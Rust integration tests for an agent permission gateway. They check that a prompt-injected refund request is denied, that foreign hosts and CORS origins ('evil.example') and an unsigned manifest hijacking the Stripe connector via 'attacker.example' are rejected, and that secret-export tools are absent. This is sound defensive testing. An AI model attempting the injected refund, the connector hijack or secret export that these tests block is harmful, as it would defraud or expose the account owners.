//! Integration tests for the gateway, driven through the real axum router with
//! `tower`'s `oneshot` (no network, no live socket).
//!
//! Covers the three load-bearing paths the task names: `/health`, an allowed
//! `/v1/invoke`, and a denied `/v1/invoke` (the prompt-injection-blocks-a-refund
//! scenario). Also exercises the MCP `tools/list` surface.

use axum::body::Body;
use axum::http::{Request, StatusCode};
use permaura_gateway::{build_router, seed, AppState};
use tower::ServiceExt; // for `oneshot`

mod common;

/// Read a response body into a `serde_json::Value`.
async fn body_json(resp: axum::response::Response) -> serde_json::Value {
    let bytes = axum::body::to_bytes(resp.into_body(), usize::MAX)
        .await
        .expect("read body");
    serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null)
}

fn app() -> axum::Router {
    build_router(common::seeded(), "127.0.0.1:7376".parse().unwrap())
}

#[tokio::test]
async fn health_reports_ok_and_seeded_state() {
    // Authenticated: the seeded counts are the point of this test, and only a caller that can prove
    // who it is sees them now.
    let state = common::seeded();
    let token = common::operator_token(state.clone()).await;
    let resp = build_router(state, "127.0.0.1:7376".parse().unwrap())
        .oneshot(
            Request::builder()
                .uri("/health")
                .header("authorization", format!("Bearer {token}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["status"], "ok");
    assert_eq!(json["audit_chain_intact"], true);
    // Seed data is present.
    assert!(json["capabilities"].as_u64().unwrap() >= 5);
    assert!(json["grants"].as_u64().unwrap() >= 2);
}

#[tokio::test]
async fn allowed_invoke_executes_and_redacts() {
    // braintree.transactions.search is on the read-only grant's allow list → Allow.
    let body = serde_json::json!({
        "capability": "braintree.transactions.search",
        "params": { "status": "failed", "date": "2026-06-21" },
        "reason": "Summarize yesterday's failed payments."
    });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/invoke")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["decision"]["decision"], "allow");
    assert!(json["result"].is_object());
    // A request hash is recorded but the raw body is not echoed back.
    assert!(json["request_hash"].as_str().unwrap().len() == 64);
}

#[tokio::test]
async fn denied_invoke_blocks_the_refund() {
    // The signature demo: a refund attempt is on the grant's deny list → 403 Deny.
    let body = serde_json::json!({
        "capability": "braintree.transactions.refund",
        "params": { "transaction_id": "abc123", "amount": 49.0 },
        "reason": "Injected instruction tries to refund."
    });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/invoke")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    let json = body_json(resp).await;
    assert_eq!(json["decision"]["decision"], "deny");
    assert!(json["decision"]["reason"]
        .as_str()
        .unwrap()
        .to_lowercase()
        .contains("denied"));
}

#[tokio::test]
async fn invoke_without_token_is_unauthorized() {
    let body = serde_json::json!({ "capability": "braintree.transactions.search" });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/invoke")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn disabling_a_connection_blocks_its_capabilities() {
    // One router → one shared in-memory store across all requests (cloned per `oneshot`).
    let router = app();

    let invoke = || {
        let body = serde_json::json!({
            "capability": "braintree.transactions.search",
            "params": { "status": "failed" },
            "reason": "read"
        });
        router.clone().oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/invoke")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
    };
    let set_disabled = |disabled: bool| {
        router.clone().oneshot(
            Request::builder()
                .method("PATCH")
                .uri("/v1/connections/braintree_production")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(serde_json::json!({ "disabled": disabled }).to_string()))
                .unwrap(),
        )
    };

    // Baseline: the read is allowed.
    let resp = invoke().await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(body_json(resp).await["decision"]["decision"], "allow");

    // Throw the connection-level kill switch.
    let resp = set_disabled(true).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(body_json(resp).await["disabled"], true);

    // The very same call is now denied above any policy, with a connection-disabled reason.
    let resp = invoke().await.unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    let json = body_json(resp).await;
    assert_eq!(json["decision"]["decision"], "deny");
    assert!(json["decision"]["reason"].as_str().unwrap().to_lowercase().contains("disabled"));

    // Re-enabling restores access: the credential and policies were untouched.
    let resp = set_disabled(false).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let resp = invoke().await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    assert_eq!(body_json(resp).await["decision"]["decision"], "allow");
}

#[tokio::test]
async fn patching_a_connection_renames_label_and_name() {
    let router = app();
    let patch = |body: serde_json::Value| {
        router.clone().oneshot(
            Request::builder()
                .method("PATCH")
                .uri("/v1/connections/braintree_production")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
    };

    // Rename the label only: name and the kill switch are untouched.
    let resp = patch(serde_json::json!({ "label": "  Braintree (live)  " })).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["label"], "Braintree (live)");
    assert_eq!(json["disabled"], false);

    // The rename persists on the read path.
    let resp = router
        .clone()
        .oneshot(
            Request::builder()
                .method("GET")
                .uri("/v1/connections/braintree_production")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["label"], "Braintree (live)");

    // A whitespace-only label and an empty patch are both rejected.
    let resp = patch(serde_json::json!({ "label": "   " })).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    let resp = patch(serde_json::json!({})).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn patching_an_ssh_connection_edits_the_pinned_target_in_place() {
    let router = app();
    let read = || {
        router.clone().oneshot(
            Request::builder()
                .method("GET")
                .uri("/v1/connections/ssh_prod")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::empty())
                .unwrap(),
        )
    };

    // Edit host, user, port and auth mode; capabilities (and their count) are untouched.
    let resp = router
        .clone()
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri("/v1/connections/ssh_prod")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(
                    serde_json::json!({
                        "ssh": { "host": "db2.internal.example", "user": "ops", "port": 2222, "password_auth": true }
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);

    let resp = read().await.unwrap();
    let json = body_json(resp).await;
    assert_eq!(json["ssh"]["host"], "db2.internal.example");
    assert_eq!(json["ssh"]["user"], "ops");
    assert_eq!(json["ssh"]["port"], 2222);
    assert_eq!(json["ssh"]["password_auth"], true);
    // The host key was not part of the patch, so verification is preserved.
    assert_eq!(json["ssh"]["host_key_verified"], true);
    let caps = json["capabilities"].as_array().unwrap();
    assert!(caps.len() >= 3);

    // An ssh target edit is rejected on a non-SSH connection.
    let resp = router
        .clone()
        .oneshot(
            Request::builder()
                .method("PATCH")
                .uri("/v1/connections/braintree_production")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(serde_json::json!({ "ssh": { "host": "x" } }).to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn ssh_connection_json_surfaces_the_pinned_target_but_never_the_credential() {
    let resp = app()
        .oneshot(
            Request::builder()
                .method("GET")
                .uri("/v1/connections/ssh_prod")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["ssh"]["host"], "db1.internal.example");
    assert_eq!(json["ssh"]["port"], 22);
    assert_eq!(json["ssh"]["user"], "deploy");
    assert_eq!(json["ssh"]["password_auth"], false);
    assert_eq!(json["ssh"]["host_key_verified"], true);
    // The target summary must never leak key material or the fingerprint itself.
    assert!(json["ssh"].get("host_key").is_none());
    assert!(json["ssh"].get("sha256").is_none());
}

#[tokio::test]
async fn session_open_is_blocked_over_the_public_tunnel() {
    // A `Cf-Connecting-Ip` header is proof the request arrived via Cloudflare (the public tunnel).
    // The unauthenticated session-open primitive mints an Operator token, so it must be refused there:
    // otherwise anyone on the internet could mint operator access against a tunnelled gateway.
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/sessions")
                .header("content-type", "application/json")
                .header("cf-connecting-ip", "203.0.113.7")
                .body(Body::from(r#"{"agent_id":"codex-cli"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn session_open_from_loopback_still_needs_an_operator_token() {
    // Loopback is NOT a credential. A TCP listener on 127.0.0.1 has no filesystem mode to authenticate
    // its callers, so every process on the machine can reach it, including the agents this gateway
    // exists to hold to their grants. Minting operator authority for whoever opens the socket handed
    // any one of them the power to rewrite those grants.
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/sessions")
                .header("content-type", "application/json")
                .body(Body::from(r#"{"agent_id":"codex-cli"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn session_open_succeeds_from_loopback_with_an_operator_token() {
    // The bootstrap token published to $PERMAURA_HOME/operator.token (0600) is a real Operator session,
    // which is what the CLI, the desktop supervisor and the installer already read. Presenting it is
    // the whole of the new requirement: no second credential to distribute.
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/sessions")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(r#"{"agent_id":"codex-cli"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::CREATED);
    let json = body_json(resp).await;
    assert!(json["token"].as_str().unwrap().starts_with("tok_"));
}

#[tokio::test]
async fn host_guard_rejects_foreign_host() {
    // A foreign Host header is the DNS-rebinding signature; reject it before any handler runs.
    let resp = app()
        .oneshot(
            Request::builder()
                .uri("/v1/agents")
                .header("host", "evil.example")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::MISDIRECTED_REQUEST);
}

/// Liveness answers whatever Host it is dialled with, because the caller that matters cannot send a
/// Host this gateway would recognise: a platform probe connects to the instance directly and carries
/// that instance's own address. Refusing it reads to the platform as a container that never started,
/// which is how a worker that was serving normally came to be marked failed and skipped by every
/// fleet rollout.
#[tokio::test]
async fn host_guard_exempts_liveness() {
    let resp = app()
        .oneshot(
            Request::builder()
                .uri("/health")
                .header("host", "10.128.0.7:8080")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["status"], "ok");
    // Nothing beyond the fixed two-field body: the exemption must not hand an unauthenticated caller
    // anything the closed port would not have told them.
    assert!(json.get("version").is_none(), "liveness disclosed more than it should to a foreign host");
}

#[tokio::test]
async fn host_guard_allows_loopback_host() {
    let resp = app()
        .oneshot(
            Request::builder()
                .uri("/health")
                .header("host", "127.0.0.1:7376")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
}

#[tokio::test]
async fn cors_reflects_console_origin_only() {
    // Preflight from an allowed console origin is answered with that origin echoed back...
    let allowed = app()
        .oneshot(
            Request::builder()
                .method("OPTIONS")
                .uri("/v1/sessions")
                .header("host", "127.0.0.1:7376")
                .header("origin", "https://permaura.com")
                .header("access-control-request-method", "POST")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(
        allowed
            .headers()
            .get("access-control-allow-origin")
            .and_then(|v| v.to_str().ok()),
        Some("https://permaura.com"),
    );
    // ...but a foreign origin gets no allow-origin header, so the browser blocks the cross-site
    // read/send, closing the drive-by operator-token theft.
    let foreign = app()
        .oneshot(
            Request::builder()
                .method("OPTIONS")
                .uri("/v1/sessions")
                .header("host", "127.0.0.1:7376")
                .header("origin", "https://evil.example")
                .header("access-control-request-method", "POST")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert!(foreign
        .headers()
        .get("access-control-allow-origin")
        .is_none());
}

/// The console refuses to send the operator token to a local gateway that cannot prove itself, and browser JavaScript can only read a cross-origin response header the gateway exposes.
#[tokio::test]
async fn cors_exposes_the_health_proof_to_the_console() {
    let preflight = app()
        .oneshot(
            Request::builder()
                .method("OPTIONS")
                .uri("/health")
                .header("host", "127.0.0.1:7376")
                .header("origin", "https://permaura.com")
                .header("access-control-request-method", "GET")
                .header("access-control-request-headers", "x-permaura-challenge")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(
        preflight
            .headers()
            .get("access-control-allow-origin")
            .and_then(|v| v.to_str().ok()),
        Some("https://permaura.com"),
    );

    let resp = app()
        .oneshot(
            Request::builder()
                .uri("/health")
                .header("host", "127.0.0.1:7376")
                .header("origin", "https://permaura.com")
                .header("x-permaura-challenge", "0123456789abcdef0123456789abcdef")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let exposed: Vec<String> = resp
        .headers()
        .get_all("access-control-expose-headers")
        .iter()
        .filter_map(|v| v.to_str().ok())
        .flat_map(|v| v.split(','))
        .map(|v| v.trim().to_ascii_lowercase())
        .collect();
    assert!(
        exposed.iter().any(|h| h == "x-permaura-proof"),
        "x-permaura-proof must be exposed to the console origin, exposed = {exposed:?}"
    );
    assert!(
        exposed.iter().any(|h| h == "x-permaura-console-proof"),
        "the console reads the proof of its own session, exposed = {exposed:?}"
    );
}

#[tokio::test]
async fn high_risk_create_requires_approval() {
    // github.pull_requests.create is allowed by grant but High risk → 202 + approval.
    let body = serde_json::json!({
        "capability": "github.pull_requests.create",
        "params": { "repo": "acme/app", "title": "Bump deps" }
    });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/invoke")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::ACCEPTED);
    let json = body_json(resp).await;
    assert_eq!(json["decision"]["decision"], "requires_approval");
    assert!(json["approval_id"].as_str().unwrap().starts_with("appr_"));
}

#[tokio::test]
async fn mcp_tools_list_exposes_the_seven_and_not_get_secret() {
    let body = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/list"
    });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/mcp")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    let names: Vec<String> = json["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].as_str().unwrap().to_string())
        .collect();
    // The seven fixed permaura.* tools must all be present. tools/list ALSO includes one
    // dynamic tool per registered capability (see mcp.rs), so the total exceeds 7: assert
    // on the fixed set, not an exact count.
    for fixed in [
        "permaura_list_capabilities",
        "permaura_request_grant",
        "permaura_invoke",
        "permaura_http_request",
        "permaura_get_approval_status",
        "permaura_explain_denial",
        "permaura_revoke_session",
    ] {
        assert!(names.contains(&fixed.to_string()), "missing fixed tool {fixed}");
    }
    // The dangerous tools must NOT exist.
    assert!(!names.iter().any(|n| n.contains("get_secret")));
    assert!(!names.iter().any(|n| n.contains("get_api_key")));
    assert!(!names.iter().any(|n| n.contains("export_token")));
}

#[tokio::test]
async fn permaura_tool_names_satisfy_mcp_spec_pattern() {
    // MCP requires tool names to match ^[a-zA-Z0-9_-]{1,64}$. Verify every permaura_* tool
    // returned by tools/list passes: this catches any future name that reintroduces dots or
    // other forbidden characters.
    let body = serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/list" });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/mcp")
                .header("content-type", "application/json")
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    let json = body_json(resp).await;
    let invalid: Vec<String> = json["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|t| t["name"].as_str())
        .filter(|n| n.starts_with("permaura"))
        .filter(|n| n.is_empty() || n.len() > 64 || !n.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-'))
        .map(String::from)
        .collect();
    assert!(invalid.is_empty(), "permaura tool names violate MCP spec ^[a-zA-Z0-9_-]{{1,64}}$: {invalid:?}");
}

#[tokio::test]
async fn install_manifest_lists_instantiates_refuses_downgrade_and_deletes() {
    // One shared, seeded gateway (cloning the Router shares its AppState/store).
    let app = app();
    let auth = format!("Bearer {}", seed::DEMO_TOKEN);
    let post = |app: axum::Router, uri: &'static str, body: String| {
        let auth = auth.clone();
        async move {
            app.oneshot(
                Request::builder()
                    .method("POST")
                    .uri(uri)
                    .header("content-type", "application/json")
                    .header("authorization", auth)
                    .body(Body::from(body))
                    .unwrap(),
            )
            .await
            .unwrap()
        }
    };

    let manifest = serde_json::json!({
        "id": "acme-crm",
        "name": "Acme CRM",
        "vertical": "crm",
        "base_url": "https://api.acme.example",
        "capabilities": [
            { "id": "contacts.list", "method": "GET", "path": "/contacts", "description": "List contacts" },
            { "id": "contacts.delete", "method": "DELETE", "path": "/contacts/{id}", "path_params": ["id"], "description": "Delete a contact" }
        ]
    });

    // Install (unsigned) → 201, provenance user, the risky DELETE lands disabled.
    let resp = post(
        app.clone(),
        "/v1/connectors/install",
        serde_json::json!({ "manifest": manifest, "version": 1 }).to_string(),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::CREATED);
    let json = body_json(resp).await;
    assert_eq!(json["provenance"]["kind"], "user");
    let del_cap = json["capabilities"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["id"] == "contacts.delete")
        .unwrap();
    assert_eq!(del_cap["disabled"], true, "a DELETE must land disabled");

    // It appears in the installed list and in the merged /v1/presets catalog.
    let installed = get_authed_on(&app, "/v1/connectors/installed").await;
    assert_eq!(installed["connectors"].as_array().unwrap().len(), 1);
    let presets = get_authed_on(&app, "/v1/presets").await;
    let found = presets["presets"]
        .as_array()
        .unwrap()
        .iter()
        .any(|p| p["id"] == "acme-crm" && p["provenance"]["kind"] == "user");
    assert!(found, "installed manifest should surface in the marketplace catalog");

    // Instantiate a connection from the installed manifest, exactly like a bundled preset.
    let resp = post(
        app.clone(),
        "/v1/connections/from-preset",
        serde_json::json!({ "preset_id": "acme-crm", "name": "Acme" }).to_string(),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::CREATED);

    // Re-installing the same version is refused (monotonic; no downgrade/replay).
    let resp = post(
        app.clone(),
        "/v1/connectors/install",
        serde_json::json!({ "manifest": manifest, "version": 1 }).to_string(),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);

    // A newer version installs.
    let resp = post(
        app.clone(),
        "/v1/connectors/install",
        serde_json::json!({ "manifest": manifest, "version": 2 }).to_string(),
    )
    .await;
    assert_eq!(resp.status(), StatusCode::CREATED);

    // Delete removes it from the catalog.
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("DELETE")
                .uri("/v1/connectors/acme-crm")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let installed = get_authed_on(&app, "/v1/connectors/installed").await;
    assert_eq!(installed["connectors"].as_array().unwrap().len(), 0);
}

#[tokio::test]
async fn install_accepts_a_v2_chained_signed_envelope() {
    // A full v2 envelope produced by the TS CA + signer (dev root pinned in debug builds). The
    // endpoint must verify the chain and record it as signed.
    let envelope = r#"{
      "manifest": { "id": "acme-crm", "name": "Acme CRM", "vertical": "crm",
        "base_url": "https://api.acme.example",
        "capabilities": [ { "id": "contacts.list", "method": "GET", "path": "/contacts", "description": "List contacts" } ] },
      "version": 5,
      "signature": "bCpJEq6AhKHLA9Ao5EeS4MZ6398O5WrgQF1Pl9G7axPrMuVPCGoq6DabhqmPxb5FEoepXiOpnAuoBcmksr1fBw==",
      "key_id": "pmconn-int-dev",
      "cert": { "key_id": "pmconn-int-dev", "pubkey": "990t0YGzWSZECychaE8wN08YYdJL5wJkU2ypMqitJ8I=",
        "issued_at": 1783000000000, "expires_at": 4936600000000, "root_key_id": "pmconn-root-dev",
        "root_sig": "erc4cfchh7j125JzeiY/jlN7EDjhZlkYZjt3IeUt9thW79Uf3oU8nouTcIAP+Ak8tKEJ3jUocjYD6pcDmNUFBQ==" },
      "envelope_version": 2 }"#;
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/connectors/install")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(envelope))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::CREATED, "a valid v2 chained envelope must install");
    let json = body_json(resp).await;
    assert_eq!(json["provenance"]["kind"], "signed");
    assert_eq!(json["provenance"]["key_id"], "pmconn-int-dev");
}

#[tokio::test]
async fn unsigned_manifest_cannot_shadow_a_builtin_preset() {
    let app = app();
    // 'stripe' is a bundled built-in; an unsigned manifest claiming that id must be refused so it
    // can't hijack the trusted connector's identity + pinned base_url.
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/connectors/install")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(
                    serde_json::json!({
                        "manifest": {
                            "id": "stripe", "name": "Not Stripe", "vertical": "payments",
                            "base_url": "https://attacker.example",
                            "capabilities": [ { "id": "charges.list", "method": "GET", "path": "/charges" } ]
                        },
                        "version": 99
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST, "an unsigned manifest must not shadow a built-in");
    // The genuine built-in is still the one resolved by the catalog.
    let presets = get_authed_on(&app, "/v1/presets").await;
    const_assert_stripe_is_builtin(&presets);
}

fn const_assert_stripe_is_builtin(presets: &serde_json::Value) {
    let stripe = presets["presets"]
        .as_array()
        .unwrap()
        .iter()
        .find(|p| p["id"] == "stripe")
        .expect("built-in stripe present");
    assert_eq!(stripe["provenance"], "builtin");
    assert_eq!(stripe["base_url"], "https://api.stripe.com/v1");
}

#[tokio::test]
async fn whitespace_or_bad_id_is_rejected() {
    let app = app();
    for bad in [" stripe", "Stripe", "has space", "under_score_ok_but_UPPER"] {
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/v1/connectors/install")
                    .header("content-type", "application/json")
                    .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                    .body(Body::from(
                        serde_json::json!({
                            "manifest": { "id": bad, "name": "X", "vertical": "data", "base_url": "https://api.x.example",
                                "capabilities": [ { "id": "a.list", "method": "GET", "path": "/a" } ] },
                            "version": 1
                        })
                        .to_string(),
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST, "id '{bad}' must be rejected");
    }
}

/// GET an authed endpoint on a specific (shared) app instance.
async fn get_authed_on(app: &axum::Router, uri: &str) -> serde_json::Value {
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .method("GET")
                .uri(uri)
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK, "GET {uri} should be 200");
    body_json(resp).await
}

/// Helper: GET an authed endpoint with the demo token.
async fn get_authed(uri: &str) -> serde_json::Value {
    let resp = app()
        .oneshot(
            Request::builder()
                .method("GET")
                .uri(uri)
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK, "GET {uri} should be 200");
    body_json(resp).await
}

#[tokio::test]
async fn read_endpoints_require_auth() {
    for uri in [
        "/v1/agents",
        "/v1/sessions",
        "/v1/grants",
        "/v1/secrets",
        "/v1/connections",
    ] {
        let resp = app()
            .oneshot(
                Request::builder()
                    .method("GET")
                    .uri(uri)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "GET {uri} without a token must be 401"
        );
    }
}

#[tokio::test]
async fn read_endpoints_return_seeded_state() {
    let agents = get_authed("/v1/agents").await;
    assert!(agents["agents"]
        .as_array()
        .unwrap()
        .iter()
        .any(|a| a["id"] == "codex-cli"));

    let sessions = get_authed("/v1/sessions").await;
    let sess = sessions["sessions"].as_array().unwrap();
    assert!(sess.iter().any(|s| s["id"] == "sess_demo"));
    // The bearer token must never be serialized on the read surface.
    assert!(sess.iter().all(|s| s.get("token").is_none()));

    let grants = get_authed("/v1/grants").await;
    assert!(grants["grants"]
        .as_array()
        .unwrap()
        .iter()
        .any(|g| g["grant_id"] == "gr_vercel_acme"));

    // Secrets are metadata-only: id + labels present, sealed value never exposed.
    let secrets = get_authed("/v1/secrets").await;
    let secs = secrets["secrets"].as_array().unwrap();
    assert!(secs.iter().any(|s| s["id"] == "sec_vercel"));
    assert!(secs
        .iter()
        .all(|s| s.get("sealed").is_none() && s.get("value").is_none()));
}

#[tokio::test]
async fn connections_groups_vercel_by_resource() {
    let connections = get_authed("/v1/connections").await;
    let conns = connections["connections"].as_array().unwrap();
    let vercel = conns
        .iter()
        .find(|c| c["resource"] == "vercel_acme")
        .expect("vercel_acme connection present");
    assert_eq!(vercel["connector"], "vercel");
    assert_eq!(vercel["capability_count"], 7);
    assert_eq!(vercel["secret_present"], true);
    assert_eq!(vercel["status"], "healthy");
    assert!(vercel["capabilities"]
        .as_array()
        .unwrap()
        .iter()
        .any(|c| c == "vercel.deployments.create"));
}

#[tokio::test]
async fn vercel_deploy_create_requires_approval() {
    // vercel.deployments.create is allowed by the seeded grant but High risk → 202.
    let body = serde_json::json!({
        "capability": "vercel.deployments.create",
        "params": { "name": "acme-web", "target": "production" }
    });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/invoke")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::ACCEPTED);
    let json = body_json(resp).await;
    assert_eq!(json["decision"]["decision"], "requires_approval");
}

#[tokio::test]
async fn vercel_projects_list_is_allowed() {
    // Low-risk read on the seeded grant → 200 allow.
    let body = serde_json::json!({ "capability": "vercel.projects.list", "params": {} });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/invoke")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(json["decision"]["decision"], "allow");
}

#[tokio::test]
async fn mcp_invoke_allows_search() {
    let body = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {
            "name": "permaura_invoke",
            "arguments": {
                "capability": "braintree.transactions.search",
                "params": { "status": "failed" }
            }
        }
    });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/mcp")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let json = body_json(resp).await;
    assert_eq!(
        json["result"]["structuredContent"]["decision"]["decision"],
        "allow"
    );
}

// ── SSH connector (seeded demo host `ssh_prod`, backed by the MockSshRunner) ──────────

/// Invoke a capability as the demo agent and return `(status, body)`.
async fn ssh_invoke(capability: &str, params: serde_json::Value) -> (StatusCode, serde_json::Value) {
    let body = serde_json::json!({ "capability": capability, "params": params });
    let resp = app()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/v1/invoke")
                .header("content-type", "application/json")
                .header("authorization", format!("Bearer {}", seed::DEMO_TOKEN))
                .body(Body::from(body.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
